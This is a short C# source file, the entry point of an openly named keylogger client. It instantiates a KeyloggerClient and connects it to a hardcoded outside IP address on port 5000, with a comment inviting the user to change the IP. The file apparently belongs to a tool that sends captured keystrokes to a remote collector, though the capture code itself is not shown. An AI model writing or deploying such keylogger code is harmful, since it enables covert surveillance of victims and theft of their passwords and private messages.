/// <summary>
/// Entry point for the keylogger client application.
/// </summary>
class Program
{
    /// <summary>
    /// The main asynchronous entry method that starts the keylogger client.
    /// </summary>
    /// <returns>A Task representing the asynchronous operation.</returns>
    static async Task Main()
    {
        var keyloggerClient = new KeyloggerClient.KeyloggerClient();

        // Connect directly to specified IP and port (change IP as needed)
        await keyloggerClient.StartAsync(host: "100.113.67.105", port: 5000);
    }
}
